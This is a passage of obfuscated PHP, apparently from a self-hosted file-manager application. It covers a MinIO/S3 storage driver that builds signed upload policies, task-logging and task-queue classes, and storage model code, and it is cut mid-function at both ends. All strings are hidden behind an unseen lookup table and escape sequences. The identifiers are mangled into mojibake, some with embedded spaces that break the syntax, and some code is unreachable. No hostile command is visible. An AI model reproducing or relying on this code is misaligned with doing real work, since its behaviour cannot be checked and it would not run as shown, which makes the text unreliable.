$¶˜£´ÔÂ = $‘ø´ĞŠ’[264] . $this->accessKey . $‘ø´ĞŠ’[4] . $È¦Ş‰˜Ù; if (strpos($·â˜©›é, $‘ø´ĞŠ’[258]) === 0) { return array($‘ø´ĞŠ’[265] => $¶˜£´ÔÂ, $‘ø´ĞŠ’[255] => $‹Ê½î‚Í); } return $¶˜£´ÔÂ; } public function listUploadParts($”Ÿ–à‘˜, $œŞµÃÏ‰ = array()) { $“¼üè =& $_SERVER[Ùæõ‰Ï’]; $â¤œ¨³ó = str_replace($“¼üè[266], $“¼üè[12], $œŞµÃÏ‰[$“¼üè[169]]); $ô„Â·‹ƒ = $this->client->listParts($this->bucket, $”Ÿ–à‘˜, $â¤œ¨³ó); if (!$ô„Â·‹ƒ) { return !1; } unset($œŞµÃÏ‰[$“¼üè[256]], $œŞµÃÏ‰[$“¼üè[260]]); $œŞµÃÏ‰[$“¼üè[97]] = $”Ÿ–à‘˜; $Å¯‰ÁÄø = $this->multiUploadAuthData($”Ÿ–à‘˜, $œŞµÃÏ‰); if (empty($Å¯‰ÁÄø)) { return !1; } return array($“¼üè[265] => $Å¯‰ÁÄø, $“¼üè[255] => $œŞµÃÏ‰[$“¼üè[255]], $“¼üè[267] => $ô„Â·‹ƒ); } public function getHost() { $ÈŠˆ›Ç =& $_SERVER[Ùæõ‰Ï’]; $ÜÓÍ€†ä = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÈŠˆ›Ç[70], $ÈŠˆ›Ç[64], $ÈŠˆ›Ç[69], $ÈŠˆ›Ç[62]))) { return $ÜÓÍ€†ä . $ÈŠˆ›Ç[8] . $this->bucket; } $ÜÓÍ€†ä = explode($ÈŠˆ›Ç[210], $ÜÓÍ€†ä); return $ÜÓÍ€†ä[0] . $ÈŠˆ›Ç[210] . $this->bucket . $ÈŠˆ›Ç[10] . $ÜÓÍ€†ä[1]; } public function size($öí€©¡„) { $æ‰œ¦‘± = $this->objectMeta($öí€©¡„); return $æ‰œ¦‘± ? $æ‰œ¦‘±[$_SERVER[Ùæõ‰Ï’][79]] : 0; } public function info($Š¨àé”ş) { if ($this->isFolder($Š¨àé”ş)) { return $this->folderInfo($Š¨àé”ş); } else { if ($this->isFile($Š¨àé”ş)) { return $this->fileInfo($Š¨àé”ş); } } return !1; } public function exist($Î‘Â‘Î²) { return $this->isFile($Î‘Â‘Î²) || $this->isFolder($Î‘Â‘Î²); } public function isFile($…şï•Ú) { return !$this->isFolder($…şï•Ú) && $this->objectMeta($…şï•Ú); } public function isFolder($º·…¬¡´) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][179], $º·…¬¡´); } protected function objectMeta($óœé•Šú) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][181], $óœé•Šú); } protected function _objectMeta($¤ı‹´¦£) { $š§´Ã˜ =& $_SERVER[Ùæõ‰Ï’]; $¤ı‹´¦£ = rtrim($¤ı‹´¦£, $š§´Ã˜[8]); try { $¢õáü­‚ = $this->client->getObjectInfo($this->bucket, $¤ı‹´¦£); if (!isset($¢õáü­‚[$š§´Ã˜[252]]) && isset($¢õáü­‚[$š§´Ã˜[268]])) { $¢õáü­‚[$š§´Ã˜[252]] = $¢õáü­‚[$š§´Ã˜[268]]; } } catch (Exception $“°í‚¤ë) { $¢õáü­‚ = !1; } if (!$¢õáü­‚) { } return $¢õáü­‚; } protected function _isFolder($ª­Û×•ë) { $Œ‚Óµ³ =& $_SERVER[Ùæõ‰Ï’]; $ª­Û×•ë = rtrim($ª­Û×•ë, $Œ‚Óµ³[8]); if ($ª­Û×•ë == $Œ‚Óµ³[12] || $ª­Û×•ë == $Œ‚Óµ³[8]) { return !0; } $üîë÷ÌÁ = $this->client->getBucket($this->bucket, $ª­Û×•ë, null, 1); if (empty($üîë÷ÌÁ[$Œ‚Óµ³[236]])) { return !1; } $‚¸òõÎø = $üîë÷ÌÁ[$Œ‚Óµ³[236]][0][$Œ‚Óµ³[32]]; return stripos($‚¸òõÎø, $ª­Û×•ë . $Œ‚Óµ³[8]) === 0 ? !0 : !1; if (substr($‚¸òõÎø, -1) == $Œ‚Óµ³[8]) { return !0; } if (get_path_this($‚¸òõÎø) == get_path_this($ª­Û×•ë)) { return !1; } return !0; } public function listObject($ÚİÈ§¥) { return $this->fileList($ÚİÈ§¥, $_SERVER[Ùæõ‰Ï’][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÂßÍş¯ı) { $©Ÿ¦ºªÌ =& $_SERVER[Ùæõ‰Ï’]; parent::__construct($ÂßÍş¯ı); $this->setSignVersion($©Ÿ¦ºªÌ[247]); if (!$this->region) { $this->region = $©Ÿ¦ºªÌ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÜŒıô©Ä = $this->getBucketRgn(); return $this->region == $ÜŒıô©Ä ? !0 : !1; } public function uploadFormData($ƒŠ„Ğ«õ, $Êî Ò = 3600) { $‹µÊˆÎ“ =& $_SERVER[Ùæõ‰Ï’]; $•ÂÑ©åó = $‹µÊˆÎ“[229]; $ô¹ñî¤ = $‹µÊˆÎ“[270]; $„ûğ·™ = $‹µÊˆÎ“[62]; $ã¢ÇÚ€Î = gmdate($‹µÊˆÎ“[271]); $ïÔ©±í¢ = gmdate($‹µÊˆÎ“[272]); $º¥•Ó´À = $‹µÊˆÎ“[273]; $ÎäÑªÊá = $Êî Ò . $‹µÊˆÎ“[12]; $í…¾˜ŠŒ = $‹µÊˆÎ“[274]; $”ÜÖéµ¼ = array($this->accessKey, $ïÔ©±í¢, $this->region, $„ûğ·™, $º¥•Ó´À); $¤‘Ãº­­ = implode($‹µÊˆÎ“[8], $”ÜÖéµ¼); $”¤ôëÍ‡ = array($‹µÊˆÎ“[275] => gmdate($‹µÊˆÎ“[276], strtotime($‹µÊˆÎ“[277])), $‹µÊˆÎ“[278] => array(array($‹µÊˆÎ“[279] => $this->bucket), array($‹µÊˆÎ“[280] => $•ÂÑ©åó), array($‹µÊˆÎ“[281], $‹µÊˆÎ“[282], $‹µÊˆÎ“[12]), array($‹µÊˆÎ“[281], $‹µÊˆÎ“[283], $‹µÊˆÎ“[12]), array($‹µÊˆÎ“[281], $‹µÊˆÎ“[284], $‹µÊˆÎ“[12]), array($‹µÊˆÎ“[285] => $í…¾˜ŠŒ), array($‹µÊˆÎ“[286] => $¤‘Ãº­­), array($‹µÊˆÎ“[287] => $ô¹ñî¤), array($‹µÊˆÎ“[288] => $ã¢ÇÚ€Î), array($‹µÊˆÎ“[289] => $ÎäÑªÊá))); $Ë·“¶™¯ = base64_encode(json_encode($”¤ôëÍ‡)); $ÛíÛŒœÁ = hash_hmac($‹µÊˆÎ“[290], $ïÔ©±í¢, $‹µÊˆÎ“[291] . $this->secret, !0); $¦İ¤˜è­ = hash_hmac($‹µÊˆÎ“[290], $this->region, $ÛíÛŒœÁ, !0); $íÛïÌÜí = hash_hmac($‹µÊˆÎ“[290], $„ûğ·™, $¦İ¤˜è­, !0); $·ÀÊ—ØÉ = hash_hmac($‹µÊˆÎ“[290], $º¥•Ó´À, $íÛïÌÜí, !0); $üåÑ³òÏ = hash_hmac($‹µÊˆÎ“[290], $Ë·“¶™¯, $·ÀÊ—ØÉ); $Ê¼ë…¡Ç = array($‹µÊˆÎ“[246] => $‹µÊˆÎ“[12], $‹µÊˆÎ“[292] => $‹µÊˆÎ“[12], $‹µÊˆÎ“[280] => $•ÂÑ©åó, $‹µÊˆÎ“[285] => $í…¾˜ŠŒ, $‹µÊˆÎ“[293] => $Ë·“¶™¯, $‹µÊˆÎ“[294] => $¤‘Ãº­­, $‹µÊˆÎ“[295] => $ô¹ñî¤, $‹µÊˆÎ“[296] => $ã¢ÇÚ€Î, $‹µÊˆÎ“[297] => $ÎäÑªÊá, $‹µÊˆÎ“[298] => $üåÑ³òÏ, $‹µÊˆÎ“[208] => $this->getHost()); return $Ê¼ë…¡Ç; } } goto b ½È…ë‹; E±Í‰í˜¤Ñ: class TaskHttp extends Task { protected function startAfter() { $¯³“†Ò =& $_SERVER[Ùæõ‰Ï’]; $îÀş®Òê =& $this->task; $îÀş®Òê[$¯³“†Ò[1858]] = 1; Hook::bind($¯³“†Ò[1826], array($this, $¯³“†Ò[1859])); Hook::bind($¯³“†Ò[1828], array($this, $¯³“†Ò[1860])); Hook::bind($¯³“†Ò[1830], array($this, $¯³“†Ò[1861])); } protected function endAfter() { $òÍâ€à =& $_SERVER[Ùæõ‰Ï’]; Hook::unbind($òÍâ€à[1826], array($this, $òÍâ€à[1859])); Hook::unbind($òÍâ€à[1828], array($this, $òÍâ€à[1860])); Hook::unbind($òÍâ€à[1830], array($this, $òÍâ€à[1861])); } public function progressStart($ŞÙÚä©ø) { $Çæ«Í¿Í =& $_SERVER[Ùæõ‰Ï’]; $ÕÇ™¤‡æ = curl_getinfo($ŞÙÚä©ø); self::log($Çæ«Í¿Í[1862] . $ÕÇ™¤‡æ[$Çæ«Í¿Í[383]]); self::valueSet($this->task[$Çæ«Í¿Í[475]], $this->task); } public function progressEnd($Öøß„îó) { $°†ì–ÃÑ =& $_SERVER[Ùæõ‰Ï’]; self::log($°†ì–ÃÑ[1863] . $this->task[$°†ì–ÃÑ[475]]); $this->end(); } public function progress($ö˜üş·à, $±º„ğº, $ÈŸ¢¿¸Ì, $Ä˜ˆËÍñ, $ì­ÄÖ) { $œç¿å–º =& $_SERVER[Ùæõ‰Ï’]; $üÄà¹ß =& $this->task; if ($ì­ÄÖ > 0) { $üÄà¹ß[$œç¿å–º[1154]] = $üÄà¹ß[$œç¿å–º[1154]] == 0 ? $Ä˜ˆËÍñ : $üÄà¹ß[$œç¿å–º[1154]]; $üÄà¹ß[$œç¿å–º[1782]] = $ì­ÄÖ; } else { if ($ÈŸ¢¿¸Ì > 0) { $üÄà¹ß[$œç¿å–º[1154]] = $üÄà¹ß[$œç¿å–º[1154]] == 0 ? $±º„ğº : $üÄà¹ß[$œç¿å–º[1154]]; $üÄà¹ß[$œç¿å–º[1782]] = $ÈŸ¢¿¸Ì; } } $this->update(); self::log("\160\x72\x6f\147\x72\x65\x73\163\110\164\164\160\72\x64\157\167\x6e\x3a{$ÈŸ¢¿¸Ì}\57{$±º„ğº}\x3b\x20\x75\160\x6c\157\x61\144\x3a{$ì­ÄÖ}\x2f{$Ä˜ˆËÍñ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¢ƒÍ§€µ, $³ª˜Ù­‰ = '', $Ï±×À“Š = 0, $Ÿ«†€–À = '') { $šØÙ½Ù =& $_SERVER[Ùæõ‰Ï’]; $Ÿ«†€–À = $Ÿ«†€–À ? $Ÿ«†€–À : ($³ª˜Ù­‰ ? $³ª˜Ù­‰ : $¢ƒÍ§€µ); $ôõÄ…§ = new Task($¢ƒÍ§€µ, $³ª˜Ù­‰, $Ï±×À“Š, $Ÿ«†€–À); $GLOBALS[$šØÙ½Ù[1864] . $¢ƒÍ§€µ] = new TaskLog($šØÙ½Ù[1765], $ôõÄ…§, $Ÿ«†€–À); return $ôõÄ…§; } public function __construct($Ø‚•ßÌÔ = '', $àƒó¹¥‹ = '', $İîø ¶¶ = '') { $‰­Ùı„¼ =& $_SERVER[Ùæõ‰Ï’]; if (!$Ø‚•ßÌÔ) { $Ø‚•ßÌÔ = $‰­Ùı„¼[1765]; } $ëÕ™Æ‰Ã = $Ø‚•ßÌÔ . $‰­Ùı„¼[462] . rand_string(10); if (!$İîø ¶¶) { $İîø ¶¶ = $Ø‚•ßÌÔ . $‰­Ùı„¼[53] . $İîø ¶¶; } switch ($Ø‚•ßÌÔ) { case $‰­Ùı„¼[1765]: if (!$àƒó¹¥‹ || !$àƒó¹¥‹->task) { return echoLog($Ø‚•ßÌÔ . $‰­Ùı„¼[1865]); } $¹ó›…±Ş = $àƒó¹¥‹; $ëÕ™Æ‰Ã = $¹ó›…±Ş->task[$‰­Ùı„¼[475]]; $Ø‚•ßÌÔ = $¹ó›…±Ş->task[$‰­Ùı„¼[475]]; if (!$¹ó›…±Ş->task[$‰­Ùı„¼[1670]]) { $¹ó›…±Ş->task[$‰­Ùı„¼[1670]] = $İîø ¶¶ ? $İîø ¶¶ : $Ø‚•ßÌÔ; } break; case $‰­Ùı„¼[1866]: if (!$àƒó¹¥‹) { return echoLog($Ø‚•ßÌÔ . $‰­Ùı„¼[1867]); } $¬¸ŞåºĞ = is_string($àƒó¹¥‹) ? array($àƒó¹¥‹) : $àƒó¹¥‹; $¹ó›…±Ş = new TaskFileTransfer($ëÕ™Æ‰Ã, $Ø‚•ßÌÔ, 0, $İîø ¶¶ ? $İîø ¶¶ : $¬¸ŞåºĞ[0]); foreach ($¬¸ŞåºĞ as $è³Ï–‰›) { $¹ó›…±Ş->addPath($è³Ï–‰›); } break; case $‰­Ùı„¼[389]: if (!$àƒó¹¥‹) { return echoLog($Ø‚•ßÌÔ . $‰­Ùı„¼[1867]); } $¬¸ŞåºĞ = is_string($àƒó¹¥‹) ? array($àƒó¹¥‹) : $àƒó¹¥‹; $¹ó›…±Ş = new TaskZip($ëÕ™Æ‰Ã, $Ø‚•ßÌÔ, 0, $İîø ¶¶ ? $İîø ¶¶ : $¬¸ŞåºĞ[0]); foreach ($¬¸ŞåºĞ as $è³Ï–‰›) { $¹ó›…±Ş->addPath($è³Ï–‰›); } break; case $‰­Ùı„¼[1312]: if (!$àƒó¹¥‹) { return echoLog($Ø‚•ßÌÔ . $‰­Ùı„¼[1867]); } $¹ó›…±Ş = new TaskUnZip($ëÕ™Æ‰Ã, $Ø‚•ßÌÔ, 0, $İîø ¶¶ ? $İîø ¶¶ : $àƒó¹¥‹); if ($àƒó¹¥‹) { $¹ó›…±Ş->addFile($àƒó¹¥‹); } break; case $‰­Ùı„¼[152]: $¹ó›…±Ş = new TaskHttp($ëÕ™Æ‰Ã, $Ø‚•ßÌÔ); break; default: return; break; } $this->task = $¹ó›…±Ş; $this->taskID = $ëÕ™Æ‰Ã; Hook::bind($‰­Ùı„¼[1802], array($this, $‰­Ùı„¼[1868])); Hook::bind($‰­Ùı„¼[1804], array($this, $‰­Ùı„¼[1869])); Hook::bind($‰­Ùı„¼[1798], array($this, $‰­Ùı„¼[1870])); echoLog($‰­Ùı„¼[1871] . $¹ó›…±Ş->task[$‰­Ùı„¼[1670]]); } public function __destruct() { $this->end(); } public function end($Õë™Îûİ = '') { $±×ãœª˜ =& $_SERVER[Ùæõ‰Ï’]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Õë™Îûİ); $this->task = !1; $this->taskID = !1; Hook::unbind($±×ãœª˜[1802], array($this, $±×ãœª˜[1868])); Hook::unbind($±×ãœª˜[1804], array($this, $±×ãœª˜[1869])); Hook::unbind($±×ãœª˜[1798], array($this, $±×ãœª˜[1870])); } public function taskUpdate($¼µˆôÍØ) { $™”ó¯ù =& $_SERVER[Ùæõ‰Ï’]; if (!$¼µˆôÍØ || $this->taskID != $¼µˆôÍØ[$™”ó¯ù[475]]) { return; } $ë§ÃŸ’ = 20; $ö™½îÀì = intval($¼µˆôÍØ[$™”ó¯ù[1783]] * $ë§ÃŸ’); $ûÙÜØ²Ç = $™”ó¯ù[176] . str_repeat($™”ó¯ù[973], $ö™½îÀì) . $™”ó¯ù[1105] . str_repeat($™”ó¯ù[53], $ë§ÃŸ’ - $ö™½îÀì) . $™”ó¯ù[178]; $€Ÿªû” = $ûÙÜØ²Ç . sprintf($™”ó¯ù[1872], $¼µˆôÍØ[$™”ó¯ù[1783]] * 100) . $™”ó¯ù[1873]; $ò®©Úôæ = $€Ÿªû” . $¼µˆôÍØ[$™”ó¯ù[1782]] . $™”ó¯ù[8] . $¼µˆôÍØ[$™”ó¯ù[1154]] . LNG($™”ó¯ù[1874]); $û´‰†ù½ = $™”ó¯ù[12]; if ($¼µˆôÍØ[$™”ó¯ù[1858]]) { $ò®©Úôæ = $€Ÿªû” . size_format($¼µˆôÍØ[$™”ó¯ù[1782]]) . $™”ó¯ù[8] . size_format($¼µˆôÍØ[$™”ó¯ù[1154]]); $û´‰†ù½ = size_format($¼µˆôÍØ[$™”ó¯ù[1784]]) . $™”ó¯ù[1875]; } if ($¼µˆôÍØ[$™”ó¯ù[1156]]) { $¼µˆôÍØ[$™”ó¯ù[1832]] = $¼µˆôÍØ[$™”ó¯ù[1156]] . $™”ó¯ù[53] . $¼µˆôÍØ[$™”ó¯ù[1832]]; } if ($¼µˆôÍØ[$™”ó¯ù[1832]]) { $ÌÔ§°ş = $™”ó¯ù[12]; if ($¼µˆôÍØ[$™”ó¯ù[1834]]) { $ÌÔ§°ş = $™”ó¯ù[50] . size_format($¼µˆôÍØ[$™”ó¯ù[1835]]) . $™”ó¯ù[8] . size_format($¼µˆôÍØ[$™”ó¯ù[1834]]); } $û´‰†ù½ .= $¼µˆôÍØ[$™”ó¯ù[1832]] . $ÌÔ§°ş; } if ($¼µˆôÍØ[$™”ó¯ù[846]] && !$¼µˆôÍØ[$™”ó¯ù[1834]]) { $û´‰†ù½ .= $™”ó¯ù[53] . size_format($¼µˆôÍØ[$™”ó¯ù[1839]]) . $™”ó¯ù[8] . size_format($¼µˆôÍØ[$™”ó¯ù[846]]); } echoLog($ò®©Úôæ . $™”ó¯ù[53] . $û´‰†ù½, !0); } public function taskEnd($¨Í€ğ°â) { $ù»Ğ¢ú« =& $_SERVER[Ùæõ‰Ï’]; if (!$¨Í€ğ°â || $this->taskID != $¨Í€ğ°â[$ù»Ğ¢ú«[475]]) { return; } $É÷Òóä = $¨Í€ğ°â ? $¨Í€ğ°â[$ù»Ğ¢ú«[1782]] . $ù»Ğ¢ú«[8] . $¨Í€ğ°â[$ù»Ğ¢ú«[1154]] . LNG($ù»Ğ¢ú«[1874]) . $ù»Ğ¢ú«[74] : $ù»Ğ¢ú«[12]; echoLog($ù»Ğ¢ú«[1876] . $¨Í€ğ°â[$ù»Ğ¢ú«[1670]] . ($¨Í€ğ°â[$ù»Ğ¢ú«[526]] ? $ù»Ğ¢ú«[74] . $¨Í€ğ°â[$ù»Ğ¢ú«[526]] : $ù»Ğ¢ú«[12]) . $ù»Ğ¢ú«[74] . $É÷Òóä . $ù»Ğ¢ú«[1877] . sprintf($ù»Ğ¢ú«[933], timeFloat() - $¨Í€ğ°â[$ù»Ğ¢ú«[1785]]) . $ù»Ğ¢ú«[1797]); $this->end(); } public function taskKill($Ïáƒ·ŒÂ) { $´˜¤€÷ =& $_SERVER[Ùæõ‰Ï’]; if (!$Ïáƒ·ŒÂ || $this->taskID != $Ïáƒ·ŒÂ[$´˜¤€÷[475]]) { return; } echoLog($´˜¤€÷[1878] . $Ïáƒ·ŒÂ[$´˜¤€÷[1670]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\x75\x65\165\145\114\145\156\x67\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\121\x75\145\165\145\x44\x61\x74\141"; const QUEUE_TIME = "\164\x61\x73\x6b\121\x75\x65\165\x65\x4c\x61\x73\164\122\x75\156"; const QUEUE_THREAD = "\164\141\163\153\121\165\145\x75\145\x54\x68\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Íë½ó¬», $Ñîı«®‰ = array(), $˜ºéû†§ = '', $ñ„Ü‡Á× = '') { $ù¦ò­° =& $_SERVER[Ùæõ‰Ï’]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ñ„Ü‡Á× && array_find_by_field(self::$listData, $ù¦ò­°[97], $ñ„Ü‡Á×)) { return !0; } if ($ñ„Ü‡Á× && array_find_by_field(self::$listDataAdd, $ù¦ò­°[97], $ñ„Ü‡Á×)) { return !0; } self::$listDataAdd[] = array($ù¦ò­°[341] => $Íë½ó¬», $ù¦ò­°[1879] => $Ñîı«®‰, $ù¦ò­°[526] => $˜ºéû†§, $ù¦ò­°[97] => $ñ„Ü‡Á×); return !0; } public static function addSubmit() { $©ÛÍ³“Ø =& $_SERVER[Ùæõ‰Ï’]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($©ÛÍ³“Ø[1880] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $©ÛÍ³“Ø[12], $©ÛÍ³“Ø[526])), $©ÛÍ³“Ø[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ö»È±º˜, $¦¾‚æ†“ = array(), $ŠÌÀ¨¥ = '', $½—‘ğ›æ = '') { $‚‘ğ»Ÿ‡ =& $_SERVER[Ùæõ‰Ï’]; if (self::count() >= self::MAX_LENGTH) { return !1; } $·®¥ÆµÂ = self::getAll(); if ($½—‘ğ›æ && array_find_by_field($·®¥ÆµÂ, $‚‘ğ»Ÿ‡[97], $½—‘ğ›æ)) { return !0; } $·®¥ÆµÂ[] = array($‚‘ğ»Ÿ‡[341] => $Ö»È±º˜, $‚‘ğ»Ÿ‡[1879] => $¦¾‚æ†“, $‚‘ğ»Ÿ‡[526] => $ŠÌÀ¨¥, $‚‘ğ»Ÿ‡[97] => $½—‘ğ›æ); self::setAll($·®¥ÆµÂ); write_log($‚‘ğ»Ÿ‡[1880] . $ŠÌÀ¨¥, $‚‘ğ»Ÿ‡[197]); return !0; } public static function run() { $×‰»Ş“ä =& $_SERVER[Ùæõ‰Ï’]; $ûàÖª£± = self::getAll(); $öîÉÔÅ« = array_shift($ûàÖª£±); if (!$öîÉÔÅ«) { return !1; } self::setAll($ûàÖª£±); $úìˆÏ¶ = timeFloat(); $ãƒ˜ı¾ = $×‰»Ş“ä[12]; try { $ãƒ˜ı¾ = Hook::apply($öîÉÔÅ«[$×‰»Ş“ä[341]], $öîÉÔÅ«[$×‰»Ş“ä[1879]]); } catch (Exception $µ™å×òÜ) { write_log($µ™å×òÜ, $×‰»Ş“ä[1277]); } $´Š¦Ù¨« = number_format(timeFloat() - $úìˆÏ¶, 3) . $×‰»Ş“ä[1797]; if ($ãƒ˜ı¾ && is_string($ãƒ˜ı¾)) { $´Š¦Ù¨« = $´Š¦Ù¨« . $×‰»Ş“ä[1881] . $ãƒ˜ı¾; } write_log($×‰»Ş“ä[1882] . $öîÉÔÅ«[$×‰»Ş“ä[526]] . $×‰»Ş“ä[1883] . $´Š¦Ù¨«, $×‰»Ş“ä[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ËûèÚ“ =& $_SERVER[Ùæõ‰Ï’]; $³Ó‹Ä•ƒ = self::threadCount() + 1; if ($³Ó‹Ä•ƒ > 3 || !self::count()) { return; } write_log($ËûèÚ“[1884] . $³Ó‹Ä•ƒ, $ËûèÚ“[197]); Cache::set(self::QUEUE_THREAD, $³Ó‹Ä•ƒ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ËûèÚ“[1885], $ËûèÚ“[197]); } public static function getKey($àÄÉêó¯, $èÁã¯‹ç = "\x69\156\164") { $ŸÌ·éµı =& $_SERVER[Ùæõ‰Ï’]; Cache::removeMemory($àÄÉêó¯); $˜Ô¸ñ¹ = Cache::get($àÄÉêó¯); if ($èÁã¯‹ç == $ŸÌ·éµı[364]) { return $˜Ô¸ñ¹ ? intval($˜Ô¸ñ¹) : 0; } if ($èÁã¯‹ç == $ŸÌ·éµı[1886]) { return is_array($˜Ô¸ñ¹) ? $˜Ô¸ñ¹ : array(); } return $˜Ô¸ñ¹; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Ùæõ‰Ï’][1886]); } public static function setAll($µÊ’Á²Í) { $ú¯‡á½÷ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($µÊ’Á²Í), $ú¯‡á½÷); Cache::set(self::QUEUE_DATA, $µÊ’Á²Í, $ú¯‡á½÷); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto fôâ³ó½; aÀ°Ã†ğ˜Á: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x73\x6f\165\x72\143\x65\123\145\x63\162\x65\x74\114\x69\163\164"; public $field = array("\x73\x6f\x75\x72\x63\x65\x49\104", "\164\x79\160\x65\111\x44", "\x63\162\145\x61\164\145\125\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\163\x74\x6f\x72\141\147\x65\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\x73\151\x7a\x65\115\141\170", "\x73\x79\x73\x74\x65\x6d", "\x64\x65\146\x61\x75\x6c\164", "\144\162\151\166\x65\x72", "\x63\x6f\156\x66\x69\x67"); public function listData($Í¾ä¼Óş = false, $ŒÑÃã ò = "\x6d\x6f\x64\151\146\171\x54\151\155\x65", $È¸“È…† = false) { $¦µûóòŞ =& $_SERVER[Ùæõ‰Ï’]; $‚ÜÌùÈ­ = parent::listData($Í¾ä¼Óş, $ŒÑÃã ò, $È¸“È…†); if ($Í¾ä¼Óş) { return $‚ÜÌùÈ­; } $ÏàÀÅæ¾ = array(); if ($GLOBALS[$¦µûóòŞ[2306]]) { $ÏàÀÅæ¾ = $this->ioSizeUseGet(array_to_keyvalue($‚ÜÌùÈ­, $¦µûóòŞ[12], $¦µûóòŞ[475])); } foreach ($‚ÜÌùÈ­ as $›”¨ï­ñ => $å¯³…€ê) { unset($‚ÜÌùÈ­[$›”¨ï­ñ][$¦µûóòŞ[6]]); $‚ÜÌùÈ­[$›”¨ï­ñ][$¦µûóòŞ[1968]] = isset($ÏàÀÅæ¾[$å¯³…€ê[$¦µûóòŞ[475]]]) ? $ÏàÀÅæ¾[$å¯³…€ê[$¦µûóòŞ[475]]] : 0; } return $‚ÜÌùÈ­; } public function ioSizeUseGet($‡ı»äí÷) { $¿óüÌ½È =& $_SERVER[Ùæõ‰Ï’]; if (!$‡ı»äí÷) { return array(); } $±‡®Ü† = $¿óüÌ½È[2307] . implode($¿óüÌ½È[50], $‡ı»äí÷); $ò÷àş‡© = Cache::get($±‡®Ü†); if ($ò÷àş‡©) { return $ò÷àş‡©; } $Çïí²Ñ› = array($¿óüÌ½È[900] => $¿óüÌ½È[475], $¿óüÌ½È[2308] => $¿óüÌ½È[79]); $ÏİÚ¬°™ = array($¿óüÌ½È[900] => array($¿óüÌ½È[7], $‡ı»äí÷)); $ò÷àş‡© = Model($¿óüÌ½È[872])->field($Çïí²Ñ›)->where($ÏİÚ¬°™)->group($¿óüÌ½È[900])->select(); $ò÷àş‡© = array_to_keyvalue($ò÷àş‡©, $¿óüÌ½È[475], $¿óüÌ½È[79]); Cache::set($±‡®Ü†, $ò÷àş‡©, 600); return $ò÷àş‡©; } public function getConfig($£®øÅØ) { $éäıÑ½ = parent::listData($£®øÅØ); return json_decode($éäıÑ½[$_SERVER[Ùæõ‰Ï’][6]], !0); } public function update($±ˆ†¸‡, $öÅÓì) { $“ÚŠ¯ë¶ =& $_SERVER[Ùæõ‰Ï’]; $åëîÒñ = $öÅÓì[$“ÚŠ¯ë¶[32]]; $ãöˆÆŠí = array_to_keyvalue(parent::listData(), $“ÚŠ¯ë¶[32]); if (isset($ãöˆÆŠí[$åëîÒñ]) && $ãöˆÆŠí[$åëîÒñ][$“ÚŠ¯ë¶[475]] != $±ˆ†¸‡) { return !1; } $this->checkPwd($±ˆ†¸‡, $öÅÓì); if (isset($öÅÓì[$“ÚŠ¯ë¶[2309]]) && $öÅÓì[$“ÚŠ¯ë¶[2309]] == $“ÚŠ¯ë¶[91]) { $this->checkConfig($öÅÓì); } unset($öÅÓì[$“ÚŠ¯ë¶[2309]]); $©°ºÙ­Ø = parent::update($±ˆ†¸‡, $öÅÓì); if ($©°ºÙ­Ø && $öÅÓì[$“ÚŠ¯ë¶[37]]) { $¿æœß• = 0; foreach ($ãöˆÆŠí as $û¤½òà¡) { if ($û¤½òà¡[$“ÚŠ¯ë¶[37]] && $û¤½òà¡[$“ÚŠ¯ë¶[475]] != $±ˆ†¸‡) { $¿æœß• = $û¤½òà¡[$“ÚŠ¯ë¶[475]]; parent::update($û¤½òà¡[$“ÚŠ¯ë¶[475]], array($“ÚŠ¯ë¶[37] => 0)); } } $this->updateBackup($±ˆ†¸‡, $¿æœß•); } return $©°ºÙ­Ø; } public function add($Á¼¾ñœ) { $ó¬ÊœÛÕ =& $_SERVER[Ùæõ‰Ï’]; $Ç”°ƒ¿¢ = array_to_keyvalue(parent::listData(), $ó¬ÊœÛÕ[32]); if (isset($Ç”°ƒ¿¢[$Á¼¾ñœ[$ó¬ÊœÛÕ[32]]])) { return !1; } $this->checkConfig($Á¼¾ñœ); $©™Ñù†Ú = parent::insert($Á¼¾ñœ); if ($©™Ñù†Ú && $Á¼¾ñœ[$ó¬ÊœÛÕ[37]]) { foreach ($Ç”°ƒ¿¢ as $”Ûæ¸Ô) { if ($”Ûæ¸Ô[$ó¬ÊœÛÕ[37]]) { parent::update($”Ûæ¸Ô[$ó¬ÊœÛÕ[475]], array($ó¬ÊœÛÕ[37] => 0)); } } } return $©™Ñù†Ú; } public function updateBackup($Æœ´³ã·, $ƒùó‚á) { 